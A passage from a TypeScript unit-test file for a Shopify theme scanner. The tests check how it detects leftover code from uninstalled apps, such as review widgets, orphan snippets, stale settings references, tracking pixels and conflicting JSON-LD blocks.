    const findings = detectGhostTextFragments(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].findingType).toBe(FindingType.GHOST_TEXT);
    expect(findings[0].appName).toBe("Judge.me");
  });

  it("detects Yotpo data attribute", () => {
    const file = {
      filename: "sections/product.liquid",
      content: '<div data-yotpo-product-id="123"></div>',
    };
    const findings = detectGhostTextFragments(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].findingType).toBe(FindingType.GHOST_TEXT);
    expect(findings[0].appName).toBe("Yotpo");
  });

  it("detects Stamped widget", () => {
    const file = {
      filename: "sections/product.liquid",
      content: '<div class="stamped-reviews-widget"></div>',
    };
    const findings = detectGhostTextFragments(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].findingType).toBe(FindingType.GHOST_TEXT);
    expect(findings[0].appName).toBe("Stamped.io");
  });

  it("ignores lines with script tags", () => {
    const file = {
      filename: "layout/theme.liquid",
      content: '<script src="https://cdn.judge.me/jdgm-widget.js"></script>',
    };
    const findings = detectGhostTextFragments(file);
    expect(findings).toHaveLength(0);
  });

  it("ignores lines with render tags", () => {
    const file = {
      filename: "layout/theme.liquid",
      content: "{% render 'jdgm-widget' %}",
    };
    const findings = detectGhostTextFragments(file);
    expect(findings).toHaveLength(0);
  });

  it("ignores unknown text patterns", () => {
    const file = {
      filename: "sections/product.liquid",
      content: '<div class="my-custom-widget"></div>',
    };
    const findings = detectGhostTextFragments(file);
    expect(findings).toHaveLength(0);
  });

  it("detects multiple apps in same file", () => {
    const file = {
      filename: "sections/product.liquid",
      content: ['<div id="jdgm-widget"></div>', '<div data-yotpo-product-id="456"></div>'].join(
        "\n",
      ),
    };
    const findings = detectGhostTextFragments(file);
    expect(findings).toHaveLength(2);
    const apps = findings.map((f) => f.appName).sort();
    expect(apps).toEqual(["Judge.me", "Yotpo"]);
  });

  it("assigns LOW severity by default", () => {
    const file = {
      filename: "sections/product.liquid",
      content: '<div id="jdgm-widget"></div>',
    };
    const findings = detectGhostTextFragments(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].severity).toBe(Severity.LOW);
  });

  it("skips non-scannable files via scanThemeFiles", () => {
    const files = [
      {
        filename: "assets/theme.js",
        content: '<div id="jdgm-widget"></div>',
      },
    ];
    const { findings } = scanThemeFiles(files);
    const textFindings = findingsOfType(findings, FindingType.GHOST_TEXT);
    expect(textFindings).toHaveLength(0);
  });

  it("downgraded to LOW inside liquid comment", () => {
    const file = {
      filename: "sections/product.liquid",
      content: ["{% comment %}", '<div id="jdgm-widget"></div>', "{% endcomment %}"].join("\n"),
    };
    const findings = detectGhostTextFragments(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].severity).toBe(Severity.LOW);
  });
});

// ---------------------------------------------------------------------------
// scanThemeFiles (integration)
// ---------------------------------------------------------------------------

describe("scanThemeFiles", () => {
  it("processes only scannable liquid files", () => {
    const files = [
      {
        filename: "assets/theme.js",
        content: '<script src="https://static.klaviyo.com/j.js"></script>',
      },
      { filename: "config/settings.json", content: '{% render "klaviyo-onsite" %}' },
      {
        filename: "layout/theme.liquid",
        content: '<script src="https://static.klaviyo.com/onsite/js/klaviyo.js"></script>',
      },
    ];
    const { findings } = scanThemeFiles(files);
    // Only layout/theme.liquid should be scanned
    expect(findings.every((f) => f.filename === "layout/theme.liquid")).toBe(true);
  });

  it("returns empty array for files with no ghost code", () => {
    const files = [
      { filename: "layout/theme.liquid", content: "<html>{{ content_for_layout }}</html>" },
    ];
    expect(scanThemeFiles(files).findings).toHaveLength(0);
  });

  it("surfaces the count of benign public-CDN libraries suppressed (gc-tus A2 telemetry)", () => {
    const files = [
      {
        filename: "layout/theme.liquid",
        content: `<script src="https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.js"></script>
<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter">
<script src="https://cdn.unknownapp.com/widget.js"></script>`,
      },
    ];
    const result = scanThemeFiles(files);
    // Two benign resources (swiper + Google Fonts) are dropped and counted; the
    // unknown third-party script is still emitted.
    expect(result.benignLibrarySkips).toBe(2);
    expect(result.unknownScripts).toHaveLength(1);
    expect(result.unknownScripts[0].url).toBe("https://cdn.unknownapp.com/widget.js");
  });

  it("reports zero benign skips when nothing is suppressed", () => {
    const files = [
      {
        filename: "layout/theme.liquid",
        content: '<script src="https://cdn.unknownapp.com/widget.js"></script>',
      },
    ];
    expect(scanThemeFiles(files).benignLibrarySkips).toBe(0);
  });

  it("aggregates findings across multiple file types", () => {
    // snippets/tracking.liquid is rendered by sections/header.liquid to avoid
    // a spurious ORPHAN_ASSET finding that would complicate this count-agnostic
    // test.  Orphan detection is exercised in its own describe block below.
    const files = [
      {
        filename: "layout/theme.liquid",
        content: '<script src="https://static.klaviyo.com/onsite/js/klaviyo.js"></script>',
      },
      {
        filename: "sections/header.liquid",
        content: '{% render "recharge-checkout-option" %}{% render "tracking" %}',
      },
      {
        filename: "snippets/tracking.liquid",
        content: '<link rel="stylesheet" href="https://cdn.judge.me/assets/v4/widget.css">',
      },
    ];
    const { findings } = scanThemeFiles(files);
    expect(findings.length).toBeGreaterThanOrEqual(3);
    const types = new Set(findings.map((f) => f.findingType));
    expect(types.has(FindingType.GHOST_SCRIPT)).toBe(true);
    expect(types.has(FindingType.GHOST_SNIPPET)).toBe(true);
    expect(types.has(FindingType.GHOST_STYLE)).toBe(true);
  });

  it("picks up GHOST_HREFLANG findings from layout files", () => {
    const files = [
      {
        filename: "layout/theme.liquid",
        content:
          '<link rel="alternate" hreflang="fr" href="https://fr.example.com/" />\n<link rel="alternate" hreflang="de" href="https://de.example.com/" />',
      },
    ];
    const { findings } = scanThemeFiles(files);
    const hreflangFindings = findingsOfType(findings, FindingType.GHOST_HREFLANG);
    expect(hreflangFindings.length).toBeGreaterThanOrEqual(2);
    expect(hreflangFindings[0].appName).toBe("Weglot");
  });

  it("picks up GHOST_JSON_LD findings from layout files", () => {
    const files = [
      {
        filename: "layout/theme.liquid",
        content: `<script type="application/ld+json">
{
  "@type": "Product",
  "url": "https://judge.me/reviews"
}
</script>`,
      },
    ];
    const { findings } = scanThemeFiles(files);
    const jsonLdFindings = findingsOfType(findings, FindingType.GHOST_JSON_LD);
    expect(jsonLdFindings).toHaveLength(1);
    expect(jsonLdFindings[0].appName).toBe("Judge.me");
  });

  it("picks up DUPLICATE_META findings from layout files", () => {
    const files = [
      {
        filename: "layout/theme.liquid",
        content: [
          '<meta name="description" content="First description">',
          '<meta name="description" content="Second description">',
        ].join("\n"),
      },
    ];
    const { findings } = scanThemeFiles(files);
    const dupeFindings = findingsOfType(findings, FindingType.DUPLICATE_META);
    expect(dupeFindings).toHaveLength(1);
    expect(dupeFindings[0].description).toContain("description");
  });

  it("returns empty array for empty files array", () => {
    expect(scanThemeFiles([]).findings).toHaveLength(0);
  });

  it("returns empty array for files with no content", () => {
    const files = [{ filename: "layout/theme.liquid", content: "" }];
    expect(scanThemeFiles(files).findings).toHaveLength(0);
  });

  it("produces finding inputs that satisfy the CreateFindingInput shape", () => {
    const files = [
      {
        filename: "layout/theme.liquid",
        content: '<script src="https://static.klaviyo.com/onsite/js/klaviyo.js"></script>',
      },
    ];
    const { findings } = scanThemeFiles(files);
    expect(findings).toHaveLength(1);
    const f = findings[0];
    expect(typeof f.filename).toBe("string");
    expect(typeof f.lineNumber).toBe("number");
    expect(typeof f.codeSnippet).toBe("string");
    expect(typeof f.description).toBe("string");
    expect(f.codeSnippet.length).toBeGreaterThan(0);
    expect(f.codeSnippet.length).toBeLessThanOrEqual(300);
  });
});

// ---------------------------------------------------------------------------
// ORPHAN_ASSET detection (integrated via scanThemeFiles)
// ---------------------------------------------------------------------------

describe("scanThemeFiles — ORPHAN_ASSET detection", () => {
  it("flags an orphan snippet file attributed to a known app", () => {
    const files = [
      { filename: "layout/theme.liquid", content: "<html>{{ content_for_layout }}</html>" },
      { filename: "snippets/klaviyo-onsite.liquid", content: "<div>old widget</div>" },
    ];
    const { findings } = scanThemeFiles(files);
    const orphans = findingsOfType(findings, FindingType.ORPHAN_ASSET);
    expect(orphans).toHaveLength(1);
    expect(orphans[0].filename).toBe("snippets/klaviyo-onsite.liquid");
    expect(orphans[0].findingType).toBe(FindingType.ORPHAN_ASSET);
    expect(orphans[0].severity).toBe(Severity.LOW);
    expect(orphans[0].appName).toBe("Klaviyo");
    expect(orphans[0].description).toContain("klaviyo-onsite");
  });

  it("does not flag a snippet that is rendered by another file", () => {
    const files = [
      {
        filename: "layout/theme.liquid",
        content: "{% render 'my-widget' %}",
      },
      { filename: "snippets/my-widget.liquid", content: "<div>widget</div>" },
    ];
    const { findings } = scanThemeFiles(files);
    const orphans = findingsOfType(findings, FindingType.ORPHAN_ASSET);
    expect(orphans).toHaveLength(0);
  });

  it("does not flag a snippet rendered by another snippet (transitive reference)", () => {
    const files = [
      {
        filename: "layout/theme.liquid",
        content: "{% render 'parent-snippet' %}",
      },
      {
        filename: "snippets/parent-snippet.liquid",
        content: "{% render 'child-snippet' %}",
      },
      { filename: "snippets/child-snippet.liquid", content: "<p>content</p>" },
    ];
    const { findings } = scanThemeFiles(files);
    const orphans = findingsOfType(findings, FindingType.ORPHAN_ASSET);
    expect(orphans).toHaveLength(0);
  });

  it("flags multiple orphan snippets attributed to known apps", () => {
    const files = [
      { filename: "layout/theme.liquid", content: "<html>{{ content_for_layout }}</html>" },
      { filename: "snippets/klaviyo-form.liquid", content: "<div>a</div>" },
      { filename: "snippets/omnisend-newsletter.liquid", content: "<div>b</div>" },
    ];
    const { findings } = scanThemeFiles(files);
    const orphans = findingsOfType(findings, FindingType.ORPHAN_ASSET);
    expect(orphans).toHaveLength(2);
    const filenames = orphans.map((f) => f.filename).sort();
    expect(filenames).toEqual([
      "snippets/klaviyo-form.liquid",
      "snippets/omnisend-newsletter.liquid",
    ]);
  });

  it("does not produce any ORPHAN_ASSET findings when there are no snippet files", () => {
    const files = [
      { filename: "layout/theme.liquid", content: "<html>{{ content_for_layout }}</html>" },
      { filename: "sections/header.liquid", content: "<header></header>" },
    ];
    const { findings } = scanThemeFiles(files);
    const orphans = findingsOfType(findings, FindingType.ORPHAN_ASSET);
    expect(orphans).toHaveLength(0);
  });

  it("produces ORPHAN_ASSET findings concurrently with ghost code findings", () => {
    const files = [
      {
        filename: "layout/theme.liquid",
        content: '<script src="https://static.klaviyo.com/onsite/js/klaviyo.js"></script>',
      },
      { filename: "snippets/omnisend-snippet.liquid", content: "<div>unused</div>" },
    ];
    const { findings } = scanThemeFiles(files);
    const ghostScripts = findingsOfType(findings, FindingType.GHOST_SCRIPT);
    const orphans = findingsOfType(findings, FindingType.ORPHAN_ASSET);
    expect(ghostScripts).toHaveLength(1);
    expect(orphans).toHaveLength(1);
  });

  it("produces ORPHAN_ASSET findings with valid CreateFindingInput shape", () => {
    const files = [
      { filename: "layout/theme.liquid", content: "<html>{{ content_for_layout }}</html>" },
      { filename: "snippets/klaviyo-tracking.liquid", content: "<div>orphan</div>" },
    ];
    const { findings } = scanThemeFiles(files);
    const orphan = findingsOfType(findings, FindingType.ORPHAN_ASSET)[0];
    expect(orphan).toBeDefined();
    expect(typeof orphan.filename).toBe("string");
    expect(typeof orphan.lineNumber).toBe("number");
    expect(typeof orphan.codeSnippet).toBe("string");
    expect(typeof orphan.description).toBe("string");
    expect(orphan.appName).toBe("Klaviyo");
  });

  it("handles a snippet file referenced via include tag (not just render)", () => {
    const files = [
      {
        filename: "layout/theme.liquid",
        content: "{% include 'legacy-widget' %}",
      },
      { filename: "snippets/legacy-widget.liquid", content: "<div>legacy</div>" },
    ];
    const { findings } = scanThemeFiles(files);
    const orphans = findingsOfType(findings, FindingType.ORPHAN_ASSET);
    expect(orphans).toHaveLength(0);
  });

  it("filters out orphan snippets that cannot be attributed to a known app", () => {
    // Stock theme snippets like icon-cart.liquid are unreferenced but are NOT ghost code.
    // Without app attribution they should be silently dropped.
    const files = [
      { filename: "layout/theme.liquid", content: "<html>{{ content_for_layout }}</html>" },
      { filename: "snippets/icon-cart.liquid", content: "<svg>...</svg>" },
      { filename: "snippets/icon-zoom.liquid", content: "<svg>...</svg>" },
      { filename: "snippets/custom-helper.liquid", content: "<div>helper</div>" },
    ];
    const { findings } = scanThemeFiles(files);
    const orphans = findingsOfType(findings, FindingType.ORPHAN_ASSET);
    expect(orphans).toHaveLength(0);
  });

  it("keeps attributed orphans and drops unattributed ones in the same scan", () => {
    // Mix of known-app orphan (should be kept) and stock theme orphan (should be dropped)
    const files = [
      { filename: "layout/theme.liquid", content: "<html>{{ content_for_layout }}</html>" },
      { filename: "snippets/klaviyo-form.liquid", content: "<div>klaviyo leftover</div>" },
      { filename: "snippets/icon-cart.liquid", content: "<svg>...</svg>" },
    ];
    const { findings } = scanThemeFiles(files);
    const orphans = findingsOfType(findings, FindingType.ORPHAN_ASSET);
    expect(orphans).toHaveLength(1);
    expect(orphans[0].filename).toBe("snippets/klaviyo-form.liquid");
    expect(orphans[0].appName).toBe("Klaviyo");
  });
});

// ---------------------------------------------------------------------------
// detectSettingsDrift
// ---------------------------------------------------------------------------

describe("detectSettingsDrift", () => {
  /** Helper to build a settings_data.json ThemeFile from a sections object. */
  function makeSettingsFile(sections: Record<string, unknown>): ThemeFile {
    return {
      filename: "config/settings_data.json",
      content: JSON.stringify({ current: { sections } }),
    };
  }

  it("detects stale section reference with known app", () => {
    const files: ThemeFile[] = [
      makeSettingsFile({
        "judgeme-reviews-abc123": { type: "judgeme_widgets", settings: {} },
      }),
      // No sections/judgeme_widgets.liquid exists
    ];
    const findings = detectSettingsDrift(files);
    expect(findings).toHaveLength(1);
    expect(findings[0].findingType).toBe(FindingType.SETTINGS_DRIFT);
    expect(findings[0].appName).toBe("Judge.me");
    expect(findings[0].filename).toBe("config/settings_data.json");
    expect(findings[0].description).toContain("judgeme_widgets");
    expect(findings[0].description).toContain("Judge.me");
  });

  it("detects stale reference with unknown app", () => {
    const files: ThemeFile[] = [
      makeSettingsFile({
        "custom-widget-xyz": { type: "some-unknown-app-section", settings: {} },
      }),
    ];
    const findings = detectSettingsDrift(files);
    expect(findings).toHaveLength(1);
    expect(findings[0].findingType).toBe(FindingType.SETTINGS_DRIFT);
    expect(findings[0].appName).toBeUndefined();
    expect(findings[0].description).toContain("some-unknown-app-section");
    expect(findings[0].description).toContain("may be from an uninstalled app");
  });

  it("skips valid section references when section file exists", () => {
    const files: ThemeFile[] = [
      makeSettingsFile({
        header: { type: "header", settings: {} },
      }),
      {
        filename: "sections/header.liquid",
        content: "<header>{{ section.settings.logo }}</header>",
      },
    ];
    const findings = detectSettingsDrift(files);
    expect(findings).toHaveLength(0);
  });

  it("handles missing settings_data.json", () => {
    const files: ThemeFile[] = [{ filename: "layout/theme.liquid", content: "<html></html>" }];
    const findings = detectSettingsDrift(files);
    expect(findings).toHaveLength(0);
  });

  it("handles malformed JSON in settings_data.json", () => {
    const files: ThemeFile[] = [
      { filename: "config/settings_data.json", content: "{ this is not valid JSON }" },
    ];
    const findings = detectSettingsDrift(files);
    expect(findings).toHaveLength(0);
  });

  it("skips Shopify built-in section types", () => {
    const files: ThemeFile[] = [
      makeSettingsFile({
        "header-group": { type: "header-group", settings: {} },
        "footer-group": { type: "footer-group", settings: {} },
        aside: { type: "aside", settings: {} },
      }),
    ];
    const findings = detectSettingsDrift(files);
    expect(findings).toHaveLength(0);
  });

  it("produces one finding per stale section reference", () => {
    const files: ThemeFile[] = [
      makeSettingsFile({
        "pagefly-section-1": { type: "pagefly", settings: {} },
        "valid-section": { type: "featured-collection", settings: {} },
        "unknown-widget": { type: "mystery-widget", settings: {} },
      }),
      { filename: "sections/featured-collection.liquid", content: "<div>collection</div>" },
    ];
    const findings = detectSettingsDrift(files);
    expect(findings).toHaveLength(2);
    const types = findings.map((f) => f.description);
    expect(types.some((d) => d.includes("pagefly"))).toBe(true);
    expect(types.some((d) => d.includes("mystery-widget"))).toBe(true);
  });

  it("sets appName correctly via identifyAppFromSnippetName", () => {
    const files: ThemeFile[] = [
      makeSettingsFile({
        "pf-section-abc": { type: "pagefly", settings: {} },
      }),
    ];
    const findings = detectSettingsDrift(files);
    expect(findings).toHaveLength(1);
    expect(findings[0].appName).toBe("PageFly");
  });

  it("assigns LOW severity by default", () => {
    const files: ThemeFile[] = [
      makeSettingsFile({
        "stale-ref": { type: "some-removed-section", settings: {} },
      }),
    ];
    const findings = detectSettingsDrift(files);
    expect(findings).toHaveLength(1);
    expect(findings[0].severity).toBe(Severity.LOW);
  });

  it("includes a code snippet from the settings entry", () => {
    const files: ThemeFile[] = [
      makeSettingsFile({
        "widget-abc": { type: "pagefly", settings: { color: "red" } },
      }),
    ];
    const findings = detectSettingsDrift(files);
    expect(findings).toHaveLength(1);
    expect(findings[0].codeSnippet).toContain("pagefly");
    expect(findings[0].codeSnippet.length).toBeLessThanOrEqual(300);
  });

  it("skips entries without a type field", () => {
    const files: ThemeFile[] = [
      makeSettingsFile({
        "broken-entry": { settings: {} },
      }),
    ];
    const findings = detectSettingsDrift(files);
    expect(findings).toHaveLength(0);
  });

  it("returns empty when current has no sections key", () => {
    const files: ThemeFile[] = [
      {
        filename: "config/settings_data.json",
        content: JSON.stringify({ current: { general: {} } }),
      },
    ];
    const findings = detectSettingsDrift(files);
    expect(findings).toHaveLength(0);
  });

  it("is included in scanThemeFiles pass 3", () => {
    const files: ThemeFile[] = [
      { filename: "layout/theme.liquid", content: "<html>{{ content_for_layout }}</html>" },
      makeSettingsFile({
        "pagefly-section-1": { type: "pagefly", settings: {} },
      }),
    ];
    const { findings } = scanThemeFiles(files);
    const driftFindings = findingsOfType(findings, FindingType.SETTINGS_DRIFT);
    expect(driftFindings).toHaveLength(1);
    expect(driftFindings[0].appName).toBe("PageFly");
  });
});

// ---------------------------------------------------------------------------
// detectGhostPixels
// ---------------------------------------------------------------------------

describe("detectGhostPixels", () => {
  it("detects Facebook Pixel (fbq)", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: [
        "<script>",
        "  fbq('init', '123456789');",
        "  fbq('track', 'PageView');",
        "</script>",
      ].join("\n"),
    };
    const findings = detectGhostPixels(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].findingType).toBe(FindingType.GHOST_PIXEL);
    expect(findings[0].appName).toBe("Facebook Pixel");
    expect(findings[0].description).toContain("fbq");
  });

  it("detects Google Analytics gtag", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: "<script>\n  gtag('config', 'UA-12345-1');\n</script>",
    };
    const findings = detectGhostPixels(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].appName).toBe("Google Analytics");
    expect(findings[0].description).toContain("gtag");
  });

  it("detects TikTok Pixel (ttq)", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: "<script>\n  ttq.load('ABC123');\n  ttq.page();\n</script>",
    };
    const findings = detectGhostPixels(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].appName).toBe("TikTok Pixel");
  });

  it("detects Pinterest Tag (pintrk)", () => {
    const file: ThemeFile = {
      filename: "sections/header.liquid",
      content: "<script>\n  pintrk('load', '123456');\n</script>",
    };
    const findings = detectGhostPixels(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].appName).toBe("Pinterest Tag");
  });

  it("detects Twitter/X Pixel (twq)", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: "<script>\n  twq('init', 'abc123');\n</script>",
    };
    const findings = detectGhostPixels(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].appName).toBe("Twitter/X Pixel");
  });

  it("detects Snapchat Pixel (snaptr)", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: "<script>\n  snaptr('init', '123456');\n</script>",
    };
    const findings = detectGhostPixels(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].appName).toBe("Snapchat Pixel");
  });

  it("detects legacy Google Analytics (_gaq)", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: "<script>\n  _gaq.push(['_trackPageview']);\n</script>",
    };
    const findings = detectGhostPixels(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].appName).toBe("Google Analytics (Legacy)");
  });

  it("deduplicates per tracker per file — multiple fbq calls produce 1 finding", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: [
        "<script>",
        "  fbq('init', '111');",
        "  fbq('track', 'PageView');",
        "  fbq('track', 'Purchase', {value: 10});",
        "</script>",
      ].join("\n"),
    };
    const findings = detectGhostPixels(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].appName).toBe("Facebook Pixel");
    // Line number should be the first occurrence
    expect(findings[0].lineNumber).toBe(2);
  });

  it("detects multiple different trackers in the same file", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: [
        "<script>",
        "  fbq('init', '111');",
        "  gtag('config', 'UA-12345-1');",
        "</script>",
      ].join("\n"),
    };
    const findings = detectGhostPixels(file);
    expect(findings).toHaveLength(2);
    const appNames = findings.map((f) => f.appName);
    expect(appNames).toContain("Facebook Pixel");
    expect(appNames).toContain("Google Analytics");
  });

  it("ignores non-tracking JavaScript", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: [
        "<script>",
        "  var x = 42;",
        "  console.log('hello');",
        "  document.addEventListener('click', function() {});",
        "  function myFunc() { return true; }",
        "</script>",
      ].join("\n"),
    };
    const findings = detectGhostPixels(file);
    expect(findings).toHaveLength(0);
  });

  it("ignores tracking-like code outside of script blocks", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: "<!-- fbq('init', '123') -->",
    };
    const findings = detectGhostPixels(file);
    expect(findings).toHaveLength(0);
  });

  it("assigns HIGH severity by default", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: "<script>\n  fbq('init', '123');\n</script>",
    };
    const findings = detectGhostPixels(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].severity).toBe(Severity.HIGH);
  });

  it("downgrades to LOW inside a Liquid comment", () => {
    // The comment opener must be within the buildSnippet window (1 line
    // before the match). Putting it on the line directly before the match
    // ensures it appears in the snippet.
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: "{% comment %} <script>\nfbq('init', '123');\n</script> {% endcomment %}",
    };
    const findings = detectGhostPixels(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].severity).toBe(Severity.LOW);
  });

  it("reports the correct line number for first occurrence", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: [
        "<html>",
        "<head>",
        "<script>",
        "  // some setup",
        "  gtag('config', 'G-XXXXX');",
        "</script>",
        "</head>",
      ].join("\n"),
    };
    const findings = detectGhostPixels(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].lineNumber).toBe(5);
  });

  it("detects Google Analytics Universal (ga with send/create/require)", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content:
        "<script>\n  ga('create', 'UA-12345-1', 'auto');\n  ga('send', 'pageview');\n</script>",
    };
    const findings = detectGhostPixels(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].appName).toBe("Google Analytics (Universal)");
  });

  it("detects Reddit Pixel (rdt)", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: "<script>\n  rdt('init', 't2_abc123');\n</script>",
    };
    const findings = detectGhostPixels(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].appName).toBe("Reddit Pixel");
  });

  it("detects Tealium (_taq)", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: "<script>\n  _taq.push(['page']);\n</script>",
    };
    const findings = detectGhostPixels(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].appName).toBe("Tealium");
  });

  it("is included in scanThemeFiles results", () => {
    const files: ThemeFile[] = [
      {
        filename: "layout/theme.liquid",
        content: "<script>\n  fbq('init', '123');\n</script>",
      },
    ];
    const { findings } = scanThemeFiles(files);
    const pixelFindings = findingsOfType(findings, FindingType.GHOST_PIXEL);
    expect(pixelFindings).toHaveLength(1);
    expect(pixelFindings[0].appName).toBe("Facebook Pixel");
  });
});

// ---------------------------------------------------------------------------
// Filename-based attribution (gc-1ql) — reproduces the d4c4c4 misattributions
// ---------------------------------------------------------------------------

describe("filename attribution overrides content-tracker attribution", () => {
  it("attributes an fbq pixel inside spreadr.liquid to Spreadr, not Facebook Pixel", () => {
    const file: ThemeFile = {
      filename: "snippets/spreadr.liquid",
      content: ["<script>", "  fbq('init', '123456789');", "</script>"].join("\n"),
    };
    const findings = detectGhostPixels(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].appName).toBe("Spreadr");
    expect(findings[0].description).toBe(
      "Inline tracking pixel left by Spreadr (calls Facebook Pixel)",
    );
  });

  it("attributes a ga() pixel inside spreadr-custom.liquid to Spreadr", () => {
    const file: ThemeFile = {
      filename: "snippets/spreadr-custom.liquid",
      content: "<script>\n  ga('send', 'pageview');\n</script>",
    };
    const findings = detectGhostPixels(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].appName).toBe("Spreadr");
    expect(findings[0].description).toBe(
      "Inline tracking pixel left by Spreadr (calls Google Analytics (Universal))",
    );
  });

  it("attributes a gtag script inside pagefly-main-js.liquid to PageFly", () => {
    const file: ThemeFile = {
      filename: "snippets/pagefly-main-js.liquid",
      content: '<script src="https://www.googletagmanager.com/gtag/js?id=G-ABC123"></script>',
    };
    const findings = detectGhostScripts(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].appName).toBe("PageFly");
    expect(findings[0].description).toBe(
      "External script left by PageFly (loads Google Tag Manager)",
    );
  });

  it("does NOT override a raw gtag pixel in a non-app-owned file (theme.liquid)", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: "<script>\n  gtag('config', 'UA-12345-1');\n</script>",
    };
    const findings = detectGhostPixels(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].appName).toBe("Google Analytics");
    expect(findings[0].description).toBe("Inline tracking pixel from Google Analytics (gtag)");
  });

  it("does NOT manufacture a GHOST_SCRIPT from an unrecognized URL in an app-owned file", () => {
    // An unrelated external script inside an EComposer section file. Content is
    // null (unpkg is not a known app), so the filename must NOT create a finding
    // — EComposer may still be installed; only a real content match is refined.
    const file: ThemeFile = {
      filename: "sections/ecom-hero.liquid",
      content: '<script src="https://unpkg.com/whatever.js"></script>',
    };
    expect(detectGhostScripts(file)).toHaveLength(0);
  });

  it("does NOT manufacture a GHOST_STYLE from an unrecognized URL in an app-owned file", () => {
    const file: ThemeFile = {
      filename: "sections/ecom-hero.liquid",
      content: '<link rel="stylesheet" href="https://unpkg.com/whatever.css">',
    };
    expect(detectGhostStyles(file)).toHaveLength(0);
  });
});

// ---------------------------------------------------------------------------
// detectJsonLdConflicts
// ---------------------------------------------------------------------------

describe("detectJsonLdConflicts", () => {
  it("detects conflicting Product JSON-LD with different aggregateRating", () => {
    const file: ThemeFile = {
      filename: "templates/product.liquid",
      content: [
        '<script type="application/ld+json">',
        '{"@type": "Product", "@context": "https://schema.org", "name": "Widget", "aggregateRating": {"@type": "AggregateRating", "ratingValue": "4.5"}}',
        "</script>",
        "<p>some content</p>",
        '<script type="application/ld+json">',
        '{"@type": "Product", "@context": "https://schema.org", "name": "Widget", "aggregateRating": {"@type": "AggregateRating", "ratingValue": "4.2"}}',
        "</script>",
      ].join("\n"),
    };
    const findings = detectJsonLdConflicts(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].findingType).toBe(FindingType.JSON_LD_CONFLICT);
    expect(findings[0].description).toContain("Product");
    expect(findings[0].description).toContain("line 1");
    expect(findings[0].lineNumber).toBe(5);
  });

  it("detects conflicting BreadcrumbList with different items", () => {
    const file: ThemeFile = {
      filename: "templates/product.liquid",
      content: [
        '<script type="application/ld+json">',
        '{"@type": "BreadcrumbList", "itemListElement": [{"@type": "ListItem", "position": 1, "name": "Home"}]}',
        "</script>",
        '<script type="application/ld+json">',
        '{"@type": "BreadcrumbList", "itemListElement": [{"@type": "ListItem", "position": 1, "name": "Shop"}]}',
        "</script>",
      ].join("\n"),
    };
    const findings = detectJsonLdConflicts(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].description).toContain("BreadcrumbList");
  });

  it("skips identical duplicate blocks (same @type, same content)", () => {
    const jsonContent = '{"@type": "Product", "@context": "https://schema.org", "name": "Widget"}';
    const file: ThemeFile = {
      filename: "templates/product.liquid",
      content: [
        `<script type="application/ld+json">${jsonContent}</script>`,
        `<script type="application/ld+json">${jsonContent}</script>`,
      ].join("\n"),
    };
    const findings = detectJsonLdConflicts(file);
    expect(findings).toHaveLength(0);
  });

  it("skips single occurrence of a type", () => {
    const file: ThemeFile = {
      filename: "templates/product.liquid",
      content: '<script type="application/ld+json">{"@type": "Product", "name": "Widget"}</script>',
    };
    const findings = detectJsonLdConflicts(file);
    expect(findings).toHaveLength(0);
  });

  it("skips blocks with Liquid template tags", () => {
    const file: ThemeFile = {
      filename: "templates/product.liquid",
      content: [
        '<script type="application/ld+json">',
        '{"@type": "Product", "name": "{{ product.title }}"}',
        "</script>",
        '<script type="application/ld+json">',
        '{"@type": "Product", "name": "Static Widget"}',
        "</script>",
      ].join("\n"),
    };
    // The Liquid block is skipped, leaving only one static block — no conflict
    const findings = detectJsonLdConflicts(file);
    expect(findings).toHaveLength(0);
  });

  it("detects multiple conflicting types in the same file", () => {
    const file: ThemeFile = {
      filename: "templates/product.liquid",
      content: [
        '<script type="application/ld+json">{"@type": "Product", "name": "A"}</script>',
        '<script type="application/ld+json">{"@type": "Product", "name": "B"}</script>',
        '<script type="application/ld+json">{"@type": "FAQPage", "mainEntity": []}</script>',
        '<script type="application/ld+json">{"@type": "FAQPage", "mainEntity": [{"@type": "Question"}]}</script>',
      ].join("\n"),
    };
    const findings = detectJsonLdConflicts(file);
